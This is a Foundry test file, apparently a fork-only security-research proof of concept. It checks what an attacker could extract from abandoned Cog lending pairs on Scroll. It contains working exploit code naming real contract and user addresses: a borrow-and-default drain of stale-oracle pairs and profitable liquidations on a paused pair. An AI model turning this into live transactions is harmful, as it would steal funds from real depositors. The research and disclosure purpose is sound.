// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IERC20, ICogPair} from "../src/ICogPair.sol";

/// @title Cog (Scroll) zombie-hunt PoC — read-only research; fork-only, no mainnet txs.
/// @notice Verifies, against live Scroll state, what an unprivileged attacker can extract from
///         the abandoned Cog isolated-lending markets (paused + unpaused pairs) today.
///
///  Findings verified here (see ../README.md):
///   A. borrow-and-default on unpaused pairs whose oracle still reports a stale ratio:
///      0x0c502351 (WETH/CRV), 0xaa230793 (rETH/USDC), 0xdefebd03 (rETH/USDC)
///   B. profitable liquidation of small insolvent positions on the PAUSED pair
///      0x63fdafa5 (USDC/WETH) — pause blocks deposits/borrows, not liquidations
///   C. the $142k WETH pair 0xa5832adc is paused -> new borrows/deposits revert
///   D. broken-scale-rate pairs (huge rate) have ~0 borrow capacity; their funds are not borrowable
///
/// Prices used for USD accounting (DefiLlama, 2026-10-12): WETH 2531.70, rETH 2964.61,
/// USDC 1.00, CRV 0.3604 (Ethereum mainnet price; Scroll CRV has no live DEX market — bridged parity).
contract CogZombieTest is Test {
    address constant ATTACKER = address(0xA11CE);

    address constant WETH = 0x5300000000000000000000000000000000000004;
    address constant USDC = 0x06efdbff2a14a7c8e15944d1f4a48f9f95f663a4;
    address constant USDT = 0xf55bec9cafdbe8730f096aa55dad6d22d44099df;
    address constant CRV  = 0xb755039edc7910c1f1bd985d48322e55a31ac0bf;
    address constant RETH = 0x53878b874283351d26d206fa512aece1bef6c0dd;

    // attack pairs
    address constant P_WETH_CRV   = 0x0c502351461904cd9430eefdc7b9df1c30e74032;
    address constant P_RETH_USDC1 = 0xaa230793737ddc517c2db9e42ca3a65178eda6d0;
    address constant P_RETH_USDC2 = 0xdefebd03e8e339737f24b67737e9d002cb03f00b;
    // big paused pair (protected from new borrows)
    address constant P_BIG_WETH_USDC = 0xa5832adc1e4487b635a483722e4fc34062467479;
    // paused pair with profitable liquidations
    address constant P_USDC_WETH_LIQ = 0x63fdafa50c09c49f594f47ea7194b721291ec50f;
    // broken-scale pair (rate ~1.7e21): borrow capacity ~ 0
    address constant P_RETH_BROKEN = 0x8b606e4aa85281ed1cbec2d25baa6ab8f3541450;

    // USD prices (1e18 scale)
    uint256 constant USD_WETH = 2531.70e18;
    uint256 constant USD_RETH = 2964.61e18;
    uint256 constant USD_USDC = 1.00e18;
    uint256 constant USD_CRV  = 0.3604e18;

    function setUp() public {
        string memory rpc = vm.envOr("SCROLL_FORK_RPC", string("https://rpc.scroll.io"));
        uint256 forkBlock = vm.envOr("SCROLL_FORK_BLOCK", uint256(0));
        if (forkBlock == 0) {
            vm.createSelectFork(rpc);
        } else {
            vm.createSelectFork(rpc, forkBlock);
        }
        vm.deal(ATTACKER, 1 ether);
        emit log_named_uint("fork_block", block.number);
    }

    function _usd(uint256 amount, uint256 price, uint8 dec) internal pure returns (uint256) {
        return (amount * price) / (10 ** dec);
    }

    /// A. borrow-and-default: deposit (stale-priced) collateral, borrow ALL pool asset, walk away.
    function _maxBorrowAttack(address pair, uint256 usdAsset, uint256 usdColl) internal returns (bool ok, uint256 assetOut, uint256 collIn) {
        ICogPair p = ICogPair(pair);
        address asset = p.asset();
        address coll = p.collateral();
        (, uint256 rate) = p.get_exchange_rate(); // refreshes stored exchange_rate from oracle (fork-only)
        uint256 B = IERC20(asset).balanceOf(pair); // live asset liquidity
        if (B == 0 || rate == 0) return (false, 0, 0);
        // solvency: coll*7.5e17 >= debt*rate  =>  need = ceil(B*rate/7.5e17)
        uint256 need = (B * rate) / 7.5e17 + 1e6;
        deal(coll, ATTACKER, need);
        vm.startPrank(ATTACKER);
        IERC20(coll).approve(pair, need);
        p.add_collateral(ATTACKER, need);
        assetOut = p.borrow(B, ATTACKER, ATTACKER);
        vm.stopPrank();
        collIn = need;
        ok = assetOut == B && assetOut > 0;
        uint8 decA = IERC20(asset).decimals();
        uint8 decC = IERC20(coll).decimals();
        uint256 usdGot = _usd(assetOut, usdAsset, decA);
        uint256 usdPaid = _usd(collIn, usdColl, decC);
        emit log_named_address("pair", pair);
        emit log_named_uint("borrowed_asset_raw", assetOut);
        emit log_named_uint("collateral_spent_raw", collIn);
        emit log_named_uint("usd_borrowed", usdGot);
        emit log_named_uint("usd_collateral_cost", usdPaid);
        emit log_named_int("usd_net_profit", int256(usdGot) - int256(usdPaid));
    }

    function test_A_borrowAndDefault_WETH_CRV() public {
        (bool ok, uint256 got, ) = _maxBorrowAttack(P_WETH_CRV, USD_WETH, USD_CRV);
        assertTrue(ok, "no extraction on WETH/CRV pair");
        assertGt(got, 0.009e18, "extraction too small");
    }

    function test_A_borrowAndDefault_RETH_USDC_1() public {
        (bool ok, , ) = _maxBorrowAttack(P_RETH_USDC1, USD_RETH, USD_USDC);
        assertTrue(ok, "no extraction on rETH/USDC pair 1");
        // this pair's asset balance was 29.6 USD-equivalent at scan time
    }

    function test_A_borrowAndDefault_RETH_USDC_2() public {
        (bool ok, , ) = _maxBorrowAttack(P_RETH_USDC2, USD_RETH, USD_USDC);
        assertTrue(ok, "no extraction on rETH/USDC pair 2");
    }

    /// B. liquidation on a paused pair: pause does not gate liquidate().
    function test_B_liquidate_insolvent_on_paused_pair() public {
        ICogPair p = ICogPair(P_USDC_WETH_LIQ);
        assertTrue(p.paused(), "expected pair paused");

        // targets found by the off-chain scan (2026-10-12, block ~35.35M); top one first
        address[5] memory users = [
            0xf522f0672107333dc549a8acedf62746844b65ce,
            0x23b651cd883c5995980c0f2df59c835664b7ec45,
            0x51f7fac90778b7b2618f177d0d0b3898caf39b64,
            0xb90df0bc8368a9fc4191d257780c677897f579d3,
            0x3e86d833ca4a6f52a2fb835d780d774080b48e1e
        ];
        deal(USDC, ATTACKER, 10_000e6);
        uint256 totalPaid = 0;
        uint256 totalGot = 0;
        for (uint256 i = 0; i < users.length; i++) {
            uint256 usdcBefore = IERC20(USDC).balanceOf(ATTACKER);
            uint256 wethBefore = IERC20(WETH).balanceOf(ATTACKER);
            vm.startPrank(ATTACKER);
            IERC20(USDC).approve(P_USDC_WETH_LIQ, type(uint256).max);
            try p.liquidate(users[i], type(uint256).max, ATTACKER) {
                // ok
            } catch {}
            vm.stopPrank();
            uint256 paid = usdcBefore - IERC20(USDC).balanceOf(ATTACKER);
            uint256 got = IERC20(WETH).balanceOf(ATTACKER) - wethBefore;
            totalPaid += paid;
            totalGot += got;
            emit log_named_address("liq_user", users[i]);
            emit log_named_uint("liq_paid_usdc_raw", paid);
            emit log_named_uint("liq_got_weth_raw", got);
        }
        assertGt(totalGot, 0, "no liquidation executed");
        uint256 usdPaid = _usd(totalPaid, USD_USDC, 6);
        uint256 usdGot = _usd(totalGot, USD_WETH, 18);
        emit log_named_uint("liq_total_usd_paid", usdPaid);
        emit log_named_uint("liq_total_usd_received", usdGot);
        assertGt(usdGot, usdPaid, "liquidation not profitable");
    }

    /// C. the $142k WETH pair is paused: deposit and borrow revert; third-party withdraw needs allowance.
    function test_C_pausedPairBlocksUnprivilegedDepositAndBorrow() public {
        ICogPair p = ICogPair(P_BIG_WETH_USDC);
        assertTrue(p.paused(), "expected big pair paused");
        uint256 wethHeld = IERC20(WETH).balanceOf(P_BIG_WETH_USDC);
        emit log_named_uint("big_pair_weth_held_raw", wethHeld);
        assertGt(wethHeld, 50e18, "expected ~56 WETH still custodied");

        vm.startPrank(ATTACKER);
        vm.expectRevert(bytes("Pair Paused"));
        p.deposit(1e6, ATTACKER);
        vm.expectRevert(bytes("Pair Paused"));
        p.borrow(1e15, ATTACKER, ATTACKER);
        vm.expectRevert(bytes("Pair Paused"));
        p.borrow(1e15, address(0xdead), ATTACKER);
        // cannot withdraw somebody else's LP shares without allowance
        address victim = address(0xeeda897df145b78e332d21c4ee45648c5d83873f); // top LP holder
        vm.expectRevert(bytes("Insufficient Allowance"));
        p.withdraw(1e18, ATTACKER, victim);
        vm.stopPrank();
    }

    /// D. broken-scale high-rate pair: ratio ~1.7e21 means borrow capacity is ~0
    function test_D_brokenScalePairHasNoBorrowCapacity() public {
        ICogPair p = ICogPair(P_RETH_BROKEN);
        uint256 B = IERC20(RETH).balanceOf(P_RETH_BROKEN);
        (, uint256 rate) = p.get_exchange_rate();
        emit log_named_uint("broken_pair_rETH_held", B);
        emit log_named_uint("broken_pair_rate", rate);
        // try to borrow 0.0001 rETH with $100k USDC collateral -> still reverts
        deal(USDC, ATTACKER, 100_000e6);
        vm.startPrank(ATTACKER);
        IERC20(USDC).approve(P_RETH_BROKEN, 100_000e6);
        p.add_collateral(ATTACKER, 100_000e6);
        vm.expectRevert(bytes("Insufficient Collateral"));
        p.borrow(1e14, ATTACKER, ATTACKER);
        vm.stopPrank();
    }
}
